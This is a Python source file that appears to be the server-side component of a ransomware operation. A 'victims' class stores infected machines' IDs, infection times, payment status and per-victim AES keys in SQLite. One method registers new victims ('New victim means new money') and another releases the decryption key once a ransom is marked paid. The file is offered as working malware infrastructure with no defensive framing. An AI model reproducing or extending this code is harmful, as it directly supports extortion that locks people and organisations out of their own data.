import sqlite3
import os 
import time
import uuid

class victims:
    def __init__(self, dbname='victims.db'):
        self.dbname = dbname
        self.vicList = []
        self.read_from_sql()

    def create_sql(self):
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS victims (
                         ID         VARCHAR(32)    NOT NULL,
                         INFTIME    VARCHAR(100)    NOT NULL,
                         RANSOM     BOOLEAN         NOT NULL,
                         PRIKEY     VARCHAR(100)    NOT NULL)""")
        db.commit()
        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, PRIKEY) 
                                VALUES ('{i}', '{t}', FALSE, '123')""".format(
                                    i=uuid.uuid1().hex,t=time.ctime()))
        db.commit()
        db.close()
    
    def read_from_sql(self):
        if not os.path.exists(self.dbname):
            self.create_sql()
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        r = cursor.execute("""SELECT ID, INFTIME, RANSOM FROM victims""")
        result = r.fetchall()
        for i in result:
            self.vicList.append({
                'vid': i[0], 
                'inftime': i[1], 
                'ransom': bool(i[2])}
            )
        print(self.vicList[0]['vid'])
        db.close()

    def new_victim(self, vid, pkey):
        '''
        New victim means new money.

        para:
            vid: generate on victim's computer
            pkey: AES-key decoded by RSA
        '''
        db = sqlite3.connect(self.dbname)
        cursor = db.cursor()
        cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, PRIKEY) 
                                VALUES ('{i}', '{t}', FALSE, '{k}')""".format(
                                    i=vid, t=time.ctime(), k=pkey))
        db.commit()
        db.close()

    def paid(self, paidid):
        '''
        Once a victim paid ransom, response AES-key and update db.

        para:
            paidid: id of victim who paid ransom
        '''
        for index,i in enumerate(self.vicList):
            if paidid == i['vid']:
                self.vicList[index]['ransom'] = True
                db = sqlite3.connect(self.dbname)
                cursor = db.cursor()
                cursor.execute("""UPDATE victims SET RANSOM=TRUE WHERE ID='{i}'""".format(i=paidid))
                db.commit()
                r = cursor.execute("""SELECT PRIKEY FROM victims WHERE ID='{i}'""".format(i=paidid))
                result = r.fetchone()
                db.close()
                print(result[0])
                # print(index, self.vicList[index])
                return result[0]
    
if __name__ == "__main__":
    # a = victims()
    # a.paid('adec76887e2f11ea865e6014b36bdca6')
    # a.new_victim(uuid.uuid1().hex, '456')